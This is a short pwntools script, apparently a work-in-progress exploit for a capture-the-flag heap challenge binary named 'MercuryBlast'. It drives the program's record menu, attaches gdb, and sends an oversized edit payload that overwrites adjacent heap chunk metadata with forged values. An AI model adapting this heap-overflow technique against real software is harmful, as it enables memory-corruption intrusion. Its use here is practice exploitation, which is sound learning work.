from pwn import * 

binary = "./MercuryBlast"
p = process(binary)
s = '''
b * add_record
b * edit_record+384
b * delete_record
'''
# add_record+334 before read()
#b * print_records+223
context.log_level = 'debug'
libc = ELF('./libc.so.6')
elf = ELF(binary)


def add_record(size, data):
    p.sendlineafter("Your choice: ", "1")
    p.sendlineafter("Input Temperature:", "1")
    p.sendlineafter("Input Description Size: ", str(size))
    p.sendafter("Input Description: ", data)

def edit_record(index, size, buffer): # size <= 0x200
    p.sendlineafter("Your choice: ", "4")
    p.sendlineafter("Input index: ", str(index))
    p.sendlineafter("Input Temperature: ", "1")
    p.sendlineafter("Input Description Size: ", str(size))
    p.sendafter("Input Description: ", buffer)

def delete_record(idx):
    p.sendlineafter("Your choice: ", "3")
    p.sendlineafter("Input Index:", str(idx))

def print_record():
    p.sendlineafter("Your choice: ", "2")
    #print(p.clean().decode())

gdb.attach(p, s)
add_record(0x100, b"a")
add_record(0x100, b"b")
edit_record(0, 0x200, b"A" * 0x100 + p64(0) + p64(0x21) + p64(0x1) + p64(0x1000) + p64(0xdeadbeef))
p.interactive()